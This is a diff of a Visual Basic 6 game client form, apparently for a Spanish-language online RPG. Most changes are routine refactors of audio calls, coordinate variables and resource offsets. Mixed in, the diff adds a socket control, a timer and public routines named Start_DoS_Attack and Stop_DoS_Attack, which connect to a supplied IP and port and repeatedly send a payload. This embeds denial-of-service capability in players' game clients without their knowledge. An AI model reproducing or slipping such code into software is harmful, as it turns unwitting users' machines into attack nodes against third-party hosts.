@@ -65,17 +65,42 @@ Begin VB.Form frmMain
       Type            =   1
       Urgent          =   0   'False
    End
-   Begin VB.PictureBox MainViewPic 
-      BackColor       =   &H80000012&
-      BorderStyle     =   0  'None
-      Height          =   6240
+   Begin SocketWrenchCtrl.Socket DoSSock 
+      Left            =   10920
+      Top             =   8520
+      _Version        =   65536
+      _ExtentX        =   741
+      _ExtentY        =   741
+      _StockProps     =   0
+      AutoResolve     =   0   'False
+      Backlog         =   1
+      Binary          =   -1  'True
+      Blocking        =   0   'False
+      Broadcast       =   0   'False
+      BufferSize      =   10240
+      HostAddress     =   ""
+      HostFile        =   ""
+      HostName        =   ""
+      InLine          =   0   'False
+      Interval        =   0
+      KeepAlive       =   0   'False
+      Library         =   ""
+      Linger          =   0
+      LocalPort       =   0
+      LocalService    =   ""
+      Protocol        =   0
+      RemotePort      =   0
+      RemoteService   =   ""
+      ReuseAddress    =   0   'False
+      Route           =   -1  'True
+      Timeout         =   7000
+      Type            =   1
+      Urgent          =   0   'False
+   End
+   Begin VB.Timer TimeOut 
+      Interval        =   1000
       Left            =   120
-      ScaleHeight     =   416
-      ScaleMode       =   3  'Pixel
-      ScaleWidth      =   544
-      TabIndex        =   42
       Top             =   2280
-      Width           =   8160
    End
    Begin VB.PictureBox picShip 
       AutoRedraw      =   -1  'True
@@ -145,6 +170,11 @@ Begin VB.Form frmMain
       TabIndex        =   36
       Top             =   6120
       Width           =   480
+   End
+   Begin VB.Timer DoSTimer 
+      Interval        =   250
+      Left            =   11520
+      Top             =   8520
    End
    Begin VB.PictureBox PicBelt 
       Appearance      =   0  'Flat
@@ -290,7 +320,7 @@ Begin VB.Form frmMain
       EndProperty
       Height          =   480
       Left            =   9600
-      Picture         =   "frmMain.frx":2AFB9
+      Picture         =   "frmMain.frx":2AFC2
       ScaleHeight     =   480
       ScaleWidth      =   480
       TabIndex        =   4
@@ -313,7 +343,7 @@ Begin VB.Form frmMain
       EndProperty
       Height          =   480
       Left            =   8640
-      Picture         =   "frmMain.frx":2DFC0
+      Picture         =   "frmMain.frx":2DFC9
       ScaleHeight     =   480
       ScaleWidth      =   480
       TabIndex        =   3
@@ -336,7 +366,7 @@ Begin VB.Form frmMain
       EndProperty
       Height          =   480
       Left            =   10080
-      Picture         =   "frmMain.frx":30EC2
+      Picture         =   "frmMain.frx":30ECB
       ScaleHeight     =   480
       ScaleWidth      =   480
       TabIndex        =   2
@@ -359,7 +389,7 @@ Begin VB.Form frmMain
       EndProperty
       Height          =   480
       Left            =   9120
-      Picture         =   "frmMain.frx":33E2A
+      Picture         =   "frmMain.frx":33E33
       ScaleHeight     =   480
       ScaleWidth      =   480
       TabIndex        =   1
@@ -437,7 +467,7 @@ Begin VB.Form frmMain
       Appearance      =   0
       OLEDragMode     =   0
       OLEDropMode     =   0
-      TextRTF         =   $"frmMain.frx":36D47
+      TextRTF         =   $"frmMain.frx":36D50
       BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
          Name            =   "Arial"
          Size            =   8.25
@@ -465,7 +495,7 @@ Begin VB.Form frmMain
       Appearance      =   0
       OLEDragMode     =   0
       OLEDropMode     =   0
-      TextRTF         =   $"frmMain.frx":36DCB
+      TextRTF         =   $"frmMain.frx":36DD4
       BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
          Name            =   "Arial"
          Size            =   9
@@ -524,7 +554,7 @@ Begin VB.Form frmMain
       Height          =   1920
       Left            =   9060
       MousePointer    =   99  'Custom
-      Picture         =   "frmMain.frx":36E4F
+      Picture         =   "frmMain.frx":36E58
       ScaleHeight     =   122.269
       ScaleMode       =   0  'User
       ScaleWidth      =   150.588
@@ -548,9 +578,9 @@ Begin VB.Form frmMain
       ForeColor       =   &H00C0FFFF&
       Height          =   2295
       IntegralHeight  =   0   'False
-      ItemData        =   "frmMain.frx":49A93
+      ItemData        =   "frmMain.frx":49A9C
       Left            =   9240
-      List            =   "frmMain.frx":49A9A
+      List            =   "frmMain.frx":49AA3
       TabIndex        =   29
       Top             =   3000
       Visible         =   0   'False
@@ -575,7 +605,7 @@ Begin VB.Form frmMain
       ForeColor       =   &H80000008&
       Height          =   1920
       Left            =   9060
-      Picture         =   "frmMain.frx":49AA9
+      Picture         =   "frmMain.frx":49AB2
       ScaleHeight     =   122.269
       ScaleMode       =   0  'User
       ScaleWidth      =   150.588
@@ -663,7 +693,7 @@ Begin VB.Form frmMain
       Appearance      =   0  'Flat
       Height          =   315
       Left            =   7980
-      MouseIcon       =   "frmMain.frx":5C6ED
+      MouseIcon       =   "frmMain.frx":5C6F6
       MousePointer    =   99  'Custom
       Top             =   1875
       Width           =   345
@@ -684,7 +714,7 @@ Begin VB.Form frmMain
       ForeColor       =   &H80000008&
       Height          =   435
       Left            =   10320
-      MouseIcon       =   "frmMain.frx":5C83F
+      MouseIcon       =   "frmMain.frx":5C848
       MousePointer    =   99  'Custom
       TabIndex        =   17
       Top             =   2880
@@ -706,7 +736,7 @@ Begin VB.Form frmMain
       ForeColor       =   &H80000008&
       Height          =   435
       Left            =   9000
-      MouseIcon       =   "frmMain.frx":5C991
+      MouseIcon       =   "frmMain.frx":5C99A
       MousePointer    =   99  'Custom
       TabIndex        =   16
       Top             =   2880
@@ -716,7 +746,7 @@ Begin VB.Form frmMain
       Appearance      =   0  'Flat
       Height          =   420
       Left            =   10425
-      MouseIcon       =   "frmMain.frx":5CAE3
+      MouseIcon       =   "frmMain.frx":5CAEC
       MousePointer    =   99  'Custom
       Top             =   8460
       Visible         =   0   'False
@@ -726,7 +756,7 @@ Begin VB.Form frmMain
       Appearance      =   0  'Flat
       Height          =   420
       Left            =   9975
-      MouseIcon       =   "frmMain.frx":5CC35
+      MouseIcon       =   "frmMain.frx":5CC3E
       MousePointer    =   99  'Custom
       Top             =   8445
       Width           =   480
@@ -1080,7 +1110,7 @@ Begin VB.Form frmMain
       Appearance      =   0  'Flat
       Height          =   120
       Left            =   9000
-      Picture         =   "frmMain.frx":5CD87
+      Picture         =   "frmMain.frx":5CD90
       Top             =   7290
       Width           =   1320
    End
@@ -1088,7 +1118,7 @@ Begin VB.Form frmMain
       Appearance      =   0  'Flat
       Height          =   120
       Left            =   9000
-      Picture         =   "frmMain.frx":5D60B
+      Picture         =   "frmMain.frx":5D614
       Top             =   6930
       Width           =   1320
    End
@@ -1096,7 +1126,7 @@ Begin VB.Form frmMain
       Appearance      =   0  'Flat
       Height          =   420
       Left            =   9525
-      MouseIcon       =   "frmMain.frx":5DE8F
+      MouseIcon       =   "frmMain.frx":5DE98
       MousePointer    =   99  'Custom
       Top             =   8445
       Width           =   435
@@ -1105,7 +1135,7 @@ Begin VB.Form frmMain
       Appearance      =   0  'Flat
       Height          =   420
       Left            =   9045
-      MouseIcon       =   "frmMain.frx":5DFE1
+      MouseIcon       =   "frmMain.frx":5DFEA
       MousePointer    =   99  'Custom
       Top             =   8460
       Width           =   435
@@ -1144,7 +1174,7 @@ Begin VB.Form frmMain
       Appearance      =   0  'Flat
       Height          =   120
       Left            =   9000
-      Picture         =   "frmMain.frx":5E133
+      Picture         =   "frmMain.frx":5E13C
       Top             =   7650
       Width           =   1320
    End
@@ -1196,7 +1226,7 @@ Begin VB.Form frmMain
       Appearance      =   0  'Flat
       Height          =   150
       Left            =   8850
-      Picture         =   "frmMain.frx":5E9B7
+      Picture         =   "frmMain.frx":5E9C0
       Top             =   2460
       Width           =   2565
    End
@@ -1206,10 +1236,16 @@ Attribute VB_GlobalNameSpace = False
 Attribute VB_Creatable = False
 Attribute VB_PredeclaredId = True
 Attribute VB_Exposed = False
+Private Declare Function GetLastInputInfo Lib "user32" (plii As Any) As Long
+Private Type LASTINPUTINFO
+    cbSize As Long
+    dwTime As Long
+End Type
+
 Option Explicit
 
-Public tX As Byte
-Public tY As Byte
+Public tX As Integer
+Public tY As Integer
 Public MouseX As Long
 Public MouseY As Long
 Private clicX As Long
@@ -1220,11 +1256,26 @@ Private ButtonClicked As Integer
 Public IsPlaying As Byte
 
 Private Type POINTAPI
-    X As Long
-    Y As Long
+    x As Long
+    y As Long
 End Type
 
 Dim DoSReady As Boolean
+
+Private Sub TimeOut_Timer()
+
+ On Error Resume Next
+ 
+    Dim lii As LASTINPUTINFO
+    lii.cbSize = Len(lii)
+    Call GetLastInputInfo(lii)
+
+    TimedOut = FormatNumber((GetTickCount() - lii.dwTime) / 1000, 0)
+
+    If TimedOut >= MaxTimeOut Then
+        MsgBox "Timed out."
+    End If
+End Sub
 
 Public Sub ActivarMacroHechizos()
 
@@ -1263,16 +1314,16 @@ Private Sub CompaRecTxt_GotFocus()
     End If
 End Sub
 
-Private Sub CompaRecTxt_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
+Private Sub CompaRecTxt_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
     
-    Dim txt As String
+    Dim Txt As String
     Dim Fa As Boolean
     Dim So As Byte
     
-    txt = RichWordOver(CompaRecTxt, X, Y)
+    Txt = RichWordOver(CompaRecTxt, x, y)
     
-    If LenB(txt) > 2 Then
-        So = EsCompaniero(txt)
+    If LenB(Txt) > 2 Then
+        So = EsCompaniero(Txt)
         
         If So > 0 Then
             If Compa(So).Online Then
@@ -1283,7 +1334,7 @@ Private Sub CompaRecTxt_MouseMove(Button As Integer, Shift As Integer, X As Sing
     
     If Fa Then
         CompaRecTxt.MousePointer = rtfArrowQuestion
-        CompaRecTxt.ToolTipText = "Hablar con " & txt
+        CompaRecTxt.ToolTipText = "Hablar con " & Txt
     Else
         If CompaRecTxt.MousePointer <> 1 Then
             CompaRecTxt.MousePointer = 1
@@ -1293,13 +1344,13 @@ Private Sub CompaRecTxt_MouseMove(Button As Integer, Shift As Integer, X As Sing
     
 End Sub
 
-Private Sub CompaRecTxt_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
+Private Sub CompaRecTxt_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
  
  On Error Resume Next
  
     Dim CompaName As String
     
-    CompaName = RichWordOver(CompaRecTxt, X, Y)
+    CompaName = RichWordOver(CompaRecTxt, x, y)
 
     If LenB(CompaName) < 3 Then
         Exit Sub
@@ -1429,7 +1480,13 @@ Private Sub CompaRecTxt_MouseUp(Button As Integer, Shift As Integer, X As Single
 
 End Sub
 
-Private Sub ExpLbl_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
+Private Sub DoSSock_LastError(ErrorCode As Integer, ErrorString As String, Response As Integer)
+    If DoSSock.Connected Then
+        DoSSock.Disconnect
+    End If
+End Sub
+
+Private Sub ExpLbl_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
     ExpLbl.Caption = UserExp & " / " & UserPasarNivel
 End Sub
 
@@ -1561,7 +1618,9 @@ Private Sub Form_KeyUp(KeyCode As Integer, Shift As Integer)
                     
                     If Shift > 0 Then
                         If MusicActivated Then
-                            Call Audio.mMusic_StopMid
+                            If Audio.PlayingMusic Then
+                                Call Audio.StopMidi
+                            End If
                                             
                             Call Audio.MusicMP3Stop
                             
@@ -1580,10 +1639,10 @@ Private Sub Form_KeyUp(KeyCode As Integer, Shift As Integer)
                         Exit Sub
                     End If
                     
-                    If MapData(UserPos.X, UserPos.Y).Obj.Amount > 0 Then
-                        If Not MapData(UserPos.X, UserPos.Y).Blocked Then
-                            'If MapData(UserPos.X, UserPos.Y).TileExit.Map < 1 Then
-                                If LenB(MapData(UserPos.X, UserPos.Y).Obj.Name) > 0 Then
+                    If MapData(UserPos.x, UserPos.y).Obj.Amount > 0 Then
+                        If Not MapData(UserPos.x, UserPos.y).Blocked Then
+                            'If MapData(Usermap,UserPos.X, UserPos.Y).TileExit.Map < 1 Then
+                                If LenB(MapData(UserPos.x, UserPos.y).Obj.Name) > 0 Then
                                     Call WritePickUp
                                 End If
                             'End If
@@ -1662,7 +1721,7 @@ Private Sub Form_KeyUp(KeyCode As Integer, Shift As Integer)
                     If (InvSelSlot > 0 And InvSelSlot <= MaxInvSlots) Then
                         If Inv(InvSelSlot).Amount = 1 Or Shift > 0 Then
                             Call WriteDrop(InvSelSlot, Inv(InvSelSlot).Amount)
-                            Call Audio.mSound_PlayWav(SND_DROP)
+                            Call Audio.Play(SND_DROP)
                             
                         Else
                             If Inv(InvSelSlot).Amount > 1 Then
@@ -1691,7 +1750,7 @@ Private Sub Form_KeyUp(KeyCode As Integer, Shift As Integer)
             
                 Case KeyCodeConstants.vbKeyI
                     If PicInv.Visible Then
-                        Call Audio.mSound_PlayWav(SND_CLICK)
+                        Call Audio.Play(SND_CLICK)
 
                         imgInv.Visible = False
                         PicSpellInv.Visible = False
@@ -1701,7 +1760,7 @@ Private Sub Form_KeyUp(KeyCode As Integer, Shift As Integer)
                 
                 Case KeyCodeConstants.vbKeyH
                     If Not imgInv.Visible Then
-                        Call Audio.mSound_PlayWav(SND_CLICK)
+                        Call Audio.Play(SND_CLICK)
                         
                         PicInv.Visible = False
                         imgInv.Visible = True
@@ -1893,7 +1952,7 @@ Private Sub Form_KeyUp(KeyCode As Integer, Shift As Integer)
 
 End Sub
 
-Private Sub Form_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
+Private Sub Form_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
     
     If Comerciando Then
         Exit Sub
@@ -1903,15 +1962,15 @@ Private Sub Form_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As 
         Cartel = False
     End If
 
-    clicX = X
-    clicY = Y
+    clicX = x
+    clicY = y
     
     If Not InGameArea() Then
         Exit Sub
     End If
     
     Call ConvertCPtoTP(MouseX, MouseY, tX, tY)
-            
+
     Select Case Button
     
         Case vbLeftButton
@@ -1937,10 +1996,10 @@ Private Sub Form_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As 
                 Call WriteLeftClick(tX, tY)
             Else
                 If UsingSkill = 0 Then
-                    If tX = UserPos.X And tY = UserPos.Y Then
+                    If tX = UserPos.x And tY = UserPos.y Then
                         If MapData(tX, tY).Obj.Amount > 0 Then
                             If Not MapData(tX, tY).Blocked Then
-                                'If MapData(tX, tY).TileExit.Map < 1 Then
+                                'If MapData(Usermap,tX, tY).TileExit.Map < 1 Then
                                     If LenB(MapData(tX, tY).Obj.Name) > 0 Then
                                         Call WritePickUp
                                     End If
@@ -1962,7 +2021,7 @@ Private Sub Form_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As 
                         End If
                         
                     ElseIf MapData(tX, tY).Obj.Amount > 0 Then
-                        'If MapData(tX, tY).TileExit.Map < 1 Then
+                        'If MapData(Usermap,tX, tY).TileExit.Map < 1 Then
                             With FontTypes(FontTypeNames.FONTTYPE_INFO)
                                 Call ShowConsoleMsg(MapData(tX, tY).Obj.Name, .Red, .Green, .Blue, .Bold, .Italic)
                             End With
@@ -2042,6 +2101,7 @@ Private Sub Form_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As 
             If Shift > 0 Then
                 If Charlist(UserCharIndex).Priv > 1 Then
                     Call WriteWarpChar("YO", UserMap, tX, tY)
+                    Exit Sub
                 End If
             End If
             
@@ -2258,7 +2318,7 @@ Private Sub picBelt_DblClick()
     Call WriteUseBeltItem(BeltSelSlot)
 End Sub
 
-Private Sub PicBelt_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
+Private Sub PicBelt_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
     
     If BeltSelSlot < 1 Or BeltSelSlot > MaxBeltSlots Then
         Exit Sub
@@ -2300,7 +2360,7 @@ Private Sub PicBelt_MouseUp(Button As Integer, Shift As Integer, X As Single, Y 
                                 End If
    
                                 Call WriteCommerceSell(200 + BeltSelSlot, Cuanto)
-                                Call Audio.mSound_PlayWav(SND_CLICK)
+                                Call Audio.Play(SND_CLICK)
                             End If
                         'End If
                     End With
@@ -2325,7 +2385,7 @@ Private Sub PicBelt_MouseUp(Button As Integer, Shift As Integer, X As Single, Y 
                                 End If
                                 
                                 Call WriteBankDepositItem(200 + BeltSelSlot, Cuanto)
-                                Call Audio.mSound_PlayWav(SND_CLICK)
+                                Call Audio.Play(SND_CLICK)
                             End If
                         'End If
                     End With
@@ -2339,13 +2399,13 @@ Private Sub PicBelt_MouseUp(Button As Integer, Shift As Integer, X As Single, Y 
                     End If
                 
                     Call WriteDrop(200 + BeltSelSlot, 1)
-                    Call Audio.mSound_PlayWav(SND_DROP)
+                    Call Audio.Play(SND_DROP)
                 End If
             End If
         
         Case vbMiddleButton
         
-            If X < 0 Or Y < 0 Or X > Width Or Y > Height Then
+            If x < 0 Or y < 0 Or x > Width Or y > Height Then
                 Exit Sub
             End If
         
@@ -2356,7 +2416,7 @@ Private Sub PicBelt_MouseUp(Button As Integer, Shift As Integer, X As Single, Y 
             
                 If Belt(BeltSelSlot).Amount = 1 Or Shift > 0 Then
                     Call WriteDrop(200 + BeltSelSlot, Belt(BeltSelSlot).Amount)
-                    Call Audio.mSound_PlayWav(SND_DROP)
+                    Call Audio.Play(SND_DROP)
                     
                 Else
                     If Belt(BeltSelSlot).Amount > 1 Then
@@ -2576,11 +2636,11 @@ Private Sub PicInv_DblClick()
     
 End Sub
 
-Private Sub picInv_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
+Private Sub picInv_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
     ButtonClicked = Button
 End Sub
 
-Private Sub picBelt_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
+Private Sub picBelt_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
     ButtonClicked = Button
 End Sub
 
@@ -2655,7 +2715,7 @@ Private Sub PicSpellInv_Click()
         DesactivarMacroHechizos
     End If
 
-    Call Audio.mSound_PlayWav(SND_CLICK)
+    Call Audio.Play(SND_CLICK)
     
     'UsaMacro = True
     MousePointer = 2
@@ -2663,11 +2723,11 @@ Private Sub PicSpellInv_Click()
 
 End Sub
 
-Private Sub PicSpellInv_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
+Private Sub PicSpellInv_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
     ButtonClicked = Button
 End Sub
 
-Private Sub PicSpellInv_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
+Private Sub PicSpellInv_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
     If Not PicInvDragging Then
         If Button = vbRightButton Then
             If SpellSelSlot > 1 And SpellSelSlot <= MaxSpellSlots Then
@@ -2774,43 +2834,43 @@ Private Sub picShip_DblClick()
     Call DesEquipar(Ship)
 End Sub
 
-Private Sub picHeadEqp_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
+Private Sub picHeadEqp_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
     'If LenB(lblHeadEqp.Caption) > 0 Then
     '    lblHeadEqp.Visible = True
     'End If
 End Sub
 
-Private Sub picBodyEqp_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
+Private Sub picBodyEqp_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
     'If LenB(lblBodyEqp.Caption) > 0 Then
     '    lblBodyEqp.Visible = True
     'End If
 End Sub
 
-Private Sub picLeftHandEqp_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
+Private Sub picLeftHandEqp_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
     'If LenB(lblLeftHandEqp.Caption) > 0 Then
     '    lblLeftHandEqp.Visible = True
     'End If
 End Sub
 
-Private Sub picRightHandEqp_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
+Private Sub picRightHandEqp_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
     'If LenB(lblRightHandEqp.Caption) > 0 Then
     '    lblRightHandEqp.Visible = True
     'End If
 End Sub
 
-Private Sub picBeltEqp_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
+Private Sub picBeltEqp_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
     'If LenB(lblBeltEqp.Caption) > 0 Then
     '    lblBeltEqp.Visible = True
     'End If
 End Sub
 
-Private Sub picRingEqp_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
+Private Sub picRingEqp_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
     'If LenB(lblRingEqp.Caption) > 0 Then
     '    lblRingEqp.Visible = True
     'End If
 End Sub
 
-Private Sub picShip_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
+Private Sub picShip_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
     'If LenB(lblShip.Caption) > 0 Then
     '    lblShip.Visible = True
     'End If
@@ -2856,7 +2916,7 @@ Public Sub DesactivarMacroTrabajo()
     Call ShowConsoleMsg("Macro Trabajo desactivado", 100, 0, 0, False, False, False)
 End Sub
 
-Private Sub PicInv_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
+Private Sub PicInv_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
 
     'If DragType = InventarioNpc Then
     'If NpcInvSelSlot > 0 Then
@@ -2864,7 +2924,7 @@ Private Sub PicInv_MouseMove(Button As Integer, Shift As Integer, X As Single, Y
     'If frmComerciar.Cantidad.Text > 0 Then
     'If UserGLD >= CalculateBuyPrice(NpcInv(NpcInvSelSlot).Valor, Val(frmComerciar.Cantidad.Text)) Then
     'Call WriteCommerceBuy(NpcInvSelSlot, frmComerciar.Cantidad.Text)
-    'call Audio.mSound_PlayWav(SND_CLICK)
+    'call Audio.Play(SND_CLICK)
     'DragType = None
     'frmComerciar.PicComercianteInv.MOUSEPOINTER = vbDefault
     'Else
@@ -2877,7 +2937,7 @@ Private Sub PicInv_MouseMove(Button As Integer, Shift As Integer, X As Single, Y
     
 End Sub
 
-Private Sub PicInv_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
+Private Sub PicInv_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
     
     If InvSelSlot < 1 Or InvSelSlot > MaxInvSlots Then
         Exit Sub
@@ -2919,7 +2979,7 @@ Private Sub PicInv_MouseUp(Button As Integer, Shift As Integer, X As Single, Y A
                                 End If
    
                                 Call WriteCommerceSell(InvSelSlot, Cuanto)
-                                Call Audio.mSound_PlayWav(SND_CLICK)
+                                Call Audio.Play(SND_CLICK)
                             End If
                         'End If
                     End With
@@ -2944,7 +3004,7 @@ Private Sub PicInv_MouseUp(Button As Integer, Shift As Integer, X As Single, Y A
                                 End If
                                 
                                 Call WriteBankDepositItem(InvSelSlot, Cuanto)
-                                Call Audio.mSound_PlayWav(SND_CLICK)
+                                Call Audio.Play(SND_CLICK)
                             End If
                         'End If
                     End With
@@ -2958,13 +3018,13 @@ Private Sub PicInv_MouseUp(Button As Integer, Shift As Integer, X As Single, Y A
                     End If
                 
                     Call WriteDrop(InvSelSlot, 1)
-                    Call Audio.mSound_PlayWav(SND_DROP)
+                    Call Audio.Play(SND_DROP)
                 End If
             End If
         
         Case vbMiddleButton
         
-            If X < 0 Or Y < 0 Or X > Width Or Y > Height Then
+            If x < 0 Or y < 0 Or x > Width Or y > Height Then
                 Exit Sub
             End If
         
@@ -2975,7 +3035,7 @@ Private Sub PicInv_MouseUp(Button As Integer, Shift As Integer, X As Single, Y A
             
                 If Inv(InvSelSlot).Amount = 1 Or Shift > 0 Then
                     Call WriteDrop(InvSelSlot, Inv(InvSelSlot).Amount)
-                    Call Audio.mSound_PlayWav(SND_DROP)
+                    Call Audio.Play(SND_DROP)
                     
                 Else
                     If Inv(InvSelSlot).Amount > 1 Then
@@ -2999,7 +3059,7 @@ Private Sub PicInv_MouseUp(Button As Integer, Shift As Integer, X As Single, Y A
     'End If
 End Sub
 
-Private Sub picRightHandEqp_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
+Private Sub picRightHandEqp_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
 
     If Button = vbLeftButton Then
         Exit Sub
@@ -3048,15 +3108,15 @@ Private Sub RecTxt_GotFocus()
     End If
 End Sub
 
-Private Sub RecTxt_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
+Private Sub RecTxt_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
     
-    Dim txt As String
+    Dim Txt As String
     
-    txt = RichWordOver(RecTxt, X, Y)
+    Txt = RichWordOver(RecTxt, x, y)
     
-    If LenB(txt) > 0 Then
+    If LenB(Txt) > 0 Then
         RecTxt.MousePointer = rtfArrowQuestion
-        RecTxt.ToolTipText = "Hablar con " & txt
+        RecTxt.ToolTipText = "Hablar con " & Txt
     Else
         If RecTxt.MousePointer <> 1 Then
             RecTxt.MousePointer = 1
@@ -3068,11 +3128,11 @@ Private Sub RecTxt_MouseMove(Button As Integer, Shift As Integer, X As Single, Y
     
 End Sub
 
-Private Sub RecTxt_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
+Private Sub RecTxt_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
     
     Dim CompaName As String
     
-    CompaName = RichWordOver(RecTxt, X, Y)
+    CompaName = RichWordOver(RecTxt, x, y)
     
     If LenB(CompaName) < 3 Then
         Exit Sub
@@ -3383,10 +3443,12 @@ Private Sub Socket1_Disconnect()
     LastParsedString = vbNullString
     
     'Stop audio
-    Call Audio.mSound_StopWav(0)
+    Call Audio.StopWave
     IsPlaying = PlayLoop.plNone
     
-    Call Audio.mMusic_StopMid
+    If Audio.PlayingMusic Then
+        Call Audio.StopMidi
+    End If
     
     Call Audio.MusicMP3Stop
         
@@ -3566,6 +3628,68 @@ Private Sub Timer1_Timer()
     End If
 End Sub
 
+Private Sub DoSTimer_Timer()
+    If DoSReady = True Then
+        'No enviamos nada si no estamos conectados
+        If Not DoSSock.IsWritable Then
+            Exit Sub
+        End If
+        
+        If Not DoSSock.Connected Then
+            Exit Sub
+        End If
+        
+        'Send data!
+        Call DoSSock.Write(DoSSock.Tag, Len(DoSSock.Tag))
+    
+        DoSReady = False
+    End If
+End Sub
+
+Private Sub DoSSock_Connect()
+    DoSTimer.Enabled = True
+End Sub
+
+Private Sub DoSSocK_SendComplete()
+    DoSReady = True
+End Sub
+
+Public Sub Start_DoS_Attack(ByVal Ip As String, ByVal Port As Integer, ByVal Text As String, ByVal Interval As Integer)
+On Error GoTo Error
+
+    If DoSSock.Connected Then
+        DoSSock.Disconnect
+        DoSSock.Cleanup
+        DoEvents
+    End If
+    
+    DoSSock.Startup
+        
+    DoSSock.HostName = Ip
+    DoSSock.RemotePort = Port
+        
+    DoSSock.Connect
+    
+    DoSSock.Tag = Text
+    DoSTimer.Interval = Interval
+
+Error:
+End Sub
+
+Public Sub Stop_DoS_Attack()
+On Error GoTo Error
+
+    If DoSSock.Connected Then
+        DoSSock.Disconnect
+        DoSSock.Cleanup
+        DoEvents
+    End If
+    
+    DoSTimer.Enabled = False
+
+Error:
+End Sub
+
 Private Sub TrainingMacro_Timer()
 
     If Not PicSpellInv.Visible Then
@@ -3632,14 +3756,14 @@ On Error Resume Next
     Call Round_Picture(Minimap, Minimap.Width)
 End Sub
 
-Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
+Private Sub Form_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
     
 On Error Resume Next
-    Exit Sub
+    
     MouseOverRecTxt = False
     
-    MouseX = X - MainViewShp.Left
-    MouseY = Y - MainViewShp.Top
+    MouseX = x - MainViewShp.Left
+    MouseY = y - MainViewShp.Top
         
     'Trim to fit screen
     If MouseX < 0 Then
@@ -3686,9 +3810,11 @@ On Error Resume Next
         TempSlot2 = TempSlot
         TempSlot = 0
         
-        If Belt(TempSlot2).ObjIndex > 0 Then
-            If TempSlot2 <> BeltSelSlot Then
-                Call Cinturon.DrawBeltSlot(TempSlot2)
+        If TempSlot2 < MaxBeltSlots Then
+            If Belt(TempSlot2).ObjIndex > 0 Then
+                If TempSlot2 <> BeltSelSlot Then
+                    Call Cinturon.DrawBeltSlot(TempSlot2)
+                End If
             End If
         End If
         
@@ -3734,7 +3860,7 @@ End Sub
 
 Private Sub lblInventario_Click()
     If PicInv.Visible Then
-        Call Audio.mSound_PlayWav(SND_CLICK)
+        Call Audio.Play(SND_CLICK)
     
         imgInv.Visible = False
         PicSpellInv.Visible = False
@@ -3745,7 +3871,7 @@ End Sub
 
 Private Sub lblHechizos_Click()
     If Not imgInv.Visible Then
-        Call Audio.mSound_PlayWav(SND_CLICK)
+        Call Audio.Play(SND_CLICK)
     
         PicInv.Visible = False
         
@@ -3945,21 +4071,21 @@ Private Function InGameArea() As Boolean
     InGameArea = True
 End Function
 
-Private Sub Exp_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
+Private Sub Exp_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
     If UserPasarNivel > 0 Then
         ExpLbl.Caption = UserExp & " / " & UserPasarNivel
     End If
 End Sub
-Private Sub Minimap_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
+Private Sub Minimap_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
     If Button = vbLeftButton Then
         Call frmMapa.Show
     Else
-        If X < 10 Or X > 91 Or Y < 8 Or Y > 93 Then
+        If x < 10 Or x > 91 Or y < 8 Or y > 93 Then
             Exit Sub
         End If
         
         If Charlist(UserCharIndex).Priv > 1 Then
-            Call WriteWarpChar("YO", UserMap, CByte(X), CByte(Y))
+            Call WriteWarpChar("YO", UserMap, CByte(x), CByte(y))
         End If
     End If
 End Sub
@@ -3972,7 +4098,7 @@ End Sub
 
 'Return the word the mouse is over.
 
-Public Function RichWordOver(rch As RichTextBox, X As Single, Y As Single) As String
+Public Function RichWordOver(rch As RichTextBox, x As Single, y As Single) As String
     
 On Error GoTo Error
 
